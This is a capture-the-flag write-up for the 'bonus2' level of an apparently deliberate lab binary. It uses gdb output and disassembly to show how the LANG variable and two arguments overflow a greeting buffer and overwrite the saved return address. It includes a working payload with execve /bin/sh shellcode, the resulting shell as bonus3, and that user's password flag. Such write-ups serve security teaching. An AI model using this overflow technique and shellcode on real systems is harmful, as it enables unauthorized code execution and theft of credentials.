## bonus2

The program in `bonus2` expects two arguments otherwise the program exit properly. <br> `0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3`<br>
The `main()` function reserves space for a *buffer[0x50]* `0x08048548 <+31>:	lea    ebx,[esp+0x50]` where `40 bytes` from the first argument __argv[1]__ will be copied and
another `32 bytes` from the second arguments __argv[2]__ will be also copied right after the first <br> `40 bytes` `0x08048594 <+107>:	add    eax,0x28`. <br>
Next a call to `getenv()` wiht the the parameter `"LANG"` is made and the the value return by `getenv()` is stored at `esp+0x9c` then two calls to `memcmp()` are
made against this value, the first will check if the string is equal to *fi* if they are equal a *global* variable stored at `0x8049988` will be set to `0x1` if 
the strings doesn't match the second call to `memcmp()` will be made this time with the string *nl* and if they are equal the *global* variable will be set `0x2`
if none of the cases are true the *global* variable as a default value of `0x0`. <br>
Next a call to the function `greetuser(buffer[0x50])` will be made.<br>
The function `greetuser()` also reserves spaces for a *greetbuffer[0x48]* and then the function will precede to check the value of the *global* variable
` 0x0804848a <+6>:	mov    eax,ds:0x8049988` against `0x2, 0x1, 0x0` depending on the result the function will `strncpy()` a *greeting* message to the *greetbuffer[0x48]* with the *LANG* that is set *(remember this, it will come in handy later)*.
Right after that the parameters we suplied to the program will be concatenated to the *greetbuffer[0x48]* `=> 0x0804850a <+134>:	lea    eax,[ebp+0x8]` <br>
*__Time to get dirty little boy!__* <br>
here smells some exploit, the `greetuser()` function is concatenating what we pass to the program as parameter to a *buffer[72]* without checking, what if we overwrite the main *eip* that is sleeping on the stack ? let's check if we can touch it :p <br>
We know that in `main()` two calls to `strncpy()` are made for copying `40 bytes` from the first argv and `32 bytes` from the second argv what gives us `72 bytes` plus the greeting that is copied into the *greetbuffer[72]* before the concatenation, it should be enough to write past the *greetbuffer[72]*, we will start with that.
```
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()

(gdb) i r
eax            0x4f	79
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xbffff630	-1073744336
esp            0xbffff5e0	0xbffff5e0
ebp            0x42424242	0x42424242
esi            0xbffff67c	-1073744260
edi            0xbffff62c	-1073744340
eip            0x8004242	0x8004242
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
As we can see the `eip` is being overwrote by only two bytes and the greeting being added to the begining is in english, lets check our `env` indeed
```
[...]
PWD=/home/user/bonus2
LANG=en_US.UTF-8
SHLVL=5
HOME=/home/user/bonus2
[...]
```
Let's check the other greeting lengh
```
0x080484ba <+54>:	mov    edx,0x8048717 (I used a little program with a printf as I could not see the string)
(gdb) x/s 0x8048717
0x8048717:	 "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 "
⇒ ./a.out 
Hyvää päivää (18 bytes) there's a space at the end and unicode
0x080484e9 <+101>:	mov    edx,0x804872a
(gdb) x/s 0x804872a
0x804872a:	 "Goedemiddag! " (13 bytes) idem
```
lets try to change our `env` it doesn't matter which we choose both are `13 bytes` long
```
:~$ export LANG="nl"
~$ env
[...]
PWD=/home/user/bonus2
LANG=nl
SHLVL=5
HOME=/home/user/bonus2
LC_TERMINAL_VERSION=3.3.12
LOGNAME=bonus2
[...]
```
Now let's re run the program again
```
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

(gdb) i r
eax            0x51	81
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xbffff640	-1073744320
esp            0xbffff5f0	0xbffff5f0
ebp            0x42424242	0x42424242 <---------------------------
esi            0xbffff68c	-1073744244
edi            0xbffff63c	-1073744324
eip            0x42424242	0x42424242  <--------------------------
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
Great we have it, now let's prepare the payload our `85 bytes` long string made the program to crash and we know the address of out *shellcode* must go in the second parameter as we can check in `ebp` and `eip`, so let's grab our *shellcode* from `level2` and make some maths:

|*shellcode*| `24 bytes`|
|-----------|-----------|
|__address__| `4 bytes` |
|*shellcode* + *address* | `28 bytes`|
|*2nd parameter*| `32 bytes`|

`28 bytes` is the total of our *shellcode* plus the `4 bytes` for our *shellcode* address, we need to put in the seconde parameter and it can take up to `32 bytes` that is perfect :p

Now we have the distance lets find the __address__ we know it is being stored at `$esp+0x50` lets check
```
(gdb) x/20xw $esp+0x50
0xbffff5f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff600:	0x41414141	0x41414141	0x41414141	0x41414141  <---- let's try this address
0xbffff610:	0x41414141	0x41414141	0x3133785c	0x3063785c
0xbffff620:	0x3035785c	0x3836785c	0x6632785c	0x6632785c
0xbffff630:	0x3337785c	0x3836785c	0x00000000	0xbffffef4
```
Build the payload
```
./bonus2 $(python -c "print 'A' * 40 ") $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x00\xf6\xff\xbf'")
```
Now lets try it
```
bonus2@RainFall:~$ ./bonus2 $(python -c "print 'A' * 40 ") $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x00\xf6\xff\xbf'")
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1�Ph//shh/bin��PS�ᙰ
                                                                         ̀���
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
